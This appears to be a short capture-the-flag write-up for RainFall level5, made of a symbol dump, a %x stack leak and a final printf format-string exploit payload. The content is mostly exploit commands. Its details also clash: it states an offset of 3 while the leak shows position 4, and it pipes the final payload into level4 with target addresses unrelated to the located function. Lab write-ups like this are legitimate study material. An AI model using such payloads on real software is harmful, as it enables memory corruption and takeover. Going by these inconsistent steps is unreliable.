

```bash
evel5@RainFall:~$ readelf -s level5 | grep o
Symbol table '.dynsym' contains 10 entries:
     5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
Symbol table '.symtab' contains 73 entries:
    31: 08048420     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    32: 0804984c     1 OBJECT  LOCAL  DEFAULT   25 completed.6159
    33: 08049850     4 OBJECT  LOCAL  DEFAULT   25 dtor_idx.6161
    39: 080485a0     0 FUNC    LOCAL  DEFAULT   13 __do_global_ctors_aux
    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    59: 08049844     0 OBJECT  GLOBAL HIDDEN    24 __dso_handle
    67: 080484a4    30 FUNC    GLOBAL DEFAULT   13 o

```

address of function o: 080484a4 -->  \xa4\x84\x04\x08

```bash
level5@RainFall:~$ (python -c 'print ("AAAABBBB" + "%x " * 20)';cat) | ./level5
AAAABBBB200 b7fd1ac0 b7ff37d0 41414141 42424242 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
```

offset of buffer of printf is `3` 


```bash
(python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")'; cat) | ./level4
```
